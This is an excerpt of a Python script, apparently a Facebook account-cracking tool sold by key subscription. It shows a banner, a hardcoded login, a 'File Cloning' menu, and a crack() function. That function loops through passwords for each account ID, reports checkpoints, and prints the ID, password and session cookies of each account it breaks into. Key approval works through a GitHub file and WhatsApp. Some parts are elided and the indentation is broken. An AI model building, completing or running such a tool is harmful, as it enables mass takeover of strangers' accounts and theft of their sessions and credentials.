...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mMAHAMUD')
...
while attemps < 12345677901:
    ...
    if username == 'MAHAMUD' and password == 'FUCK':
...
os.system('espeak -a 300 " Welcome,   to,  MAHAMUD,  King,  Tools"')
os.system('xdg-open https://www.facebook.com/DADAVAIMAHAMUD')
def banner():
	os.system("clear")
	print (f"""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;41m        [ WORKING ONLY MOBILE AND WIFI DATA ]         \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mSHAWON XYZ CYBER ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • SHAWON King ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mSHAWON-King ]   ║\33[1;34m   
╠══[Whatsapp                 • 0174**95 ]  ║\33[1;35m 
╠══[TOOLS                    • FREE  ]        ║ \33[1;32m   
╠══[VERSION                  • 3.6 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
def login():
	banner()
Shawonj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	SHAWON('\033[0;97m===============================================')
	SHAWON= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if SHAWON in ['m']:
		public()
	elif SHAWON in ['1']:
		crack_file()
		...
		os.system('xdg-open https://wa.me/+88017****')
	elif SHAWON in ['0']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[SHAWON XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#SHAWON-King
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•SHAWON-Cp] {idf} • {pw}')     
				...
				#SHAWON-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•SHAWON-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " SHAWON,  Ok,  id"')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/mahamudking/MAHAMUD-APPROVEL/blob/main/APPROVAL.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m MAHAMUD King, ToOLs Daily Update")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+MAHAMUD+key1)
		...
		time.sleep(3.5)
		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+MAHAMUD+''+key1
		os.system('am start https://wa.me/+8801704076023?text=' + tks)
		Subscraption() 
Subscraption() 
login()
